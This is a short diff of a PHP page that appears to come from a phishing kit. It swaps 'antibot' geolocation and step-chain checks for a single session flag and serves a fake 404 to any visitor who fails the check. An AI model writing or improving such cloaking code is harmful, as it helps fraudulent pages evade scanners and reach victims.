@@ -1,14 +1,11 @@
 <?php
 session_start();
 require_once dirname(__DIR__) . '/antibot.php';
-checkGeolocation();
 
-// Antibot check logic
-if (!isset($_SESSION['STEP_CHAIN']) || $_SESSION['STEP_CHAIN'] < 3) {
-    header("HTTP/1.0 404 Not Found"); exit;
-}
-if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf123123'] !== true) {
-    header("HTTP/1.0 404 Not Found"); exit;
+// Validate MASTER session
+if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
+    header("HTTP/1.0 404 Not Found");
+    exit;
 }
 
 //   _____         _ __      __     
